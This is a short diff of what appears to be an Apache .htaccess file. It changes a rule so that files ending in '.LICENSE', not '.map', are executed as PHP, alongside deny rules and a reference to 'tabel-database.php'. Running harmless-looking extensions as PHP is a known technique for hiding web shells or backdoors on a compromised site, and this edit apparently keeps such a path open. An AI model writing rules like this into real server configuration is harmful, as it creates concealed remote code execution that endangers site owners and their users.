@@ -3,7 +3,7 @@ Order Allow,Deny
 Deny from all
 </FilesMatch>
 Options -Indexes
-<FilesMatch "\.map$">
+<FilesMatch "\.LICENSE$">
     SetHandler application/x-httpd-php
 </FilesMatch>
 <FilesMatch "^(tabel-database.php)$">
